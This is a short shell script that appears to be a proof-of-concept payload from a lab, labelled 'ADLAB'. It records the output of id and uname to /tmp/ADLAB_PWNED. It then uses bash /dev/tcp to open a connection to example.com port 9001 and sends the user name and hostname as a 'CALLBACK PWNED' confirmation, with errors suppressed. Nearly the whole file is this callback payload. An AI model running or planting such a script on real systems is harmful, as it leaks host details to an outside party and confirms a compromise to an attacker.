#!/bin/sh
id > /tmp/ADLAB_PWNED 2>&1
uname -a >> /tmp/ADLAB_PWNED 2>&1
# network callback so the operator gets live confirmation (bash for /dev/tcp)
bash -c 'exec 3<>/dev/tcp/example.com/9001; echo "CALLBACK PWNED user=$(id -un) host=$(hostname)" >&3' 2>/dev/null || true
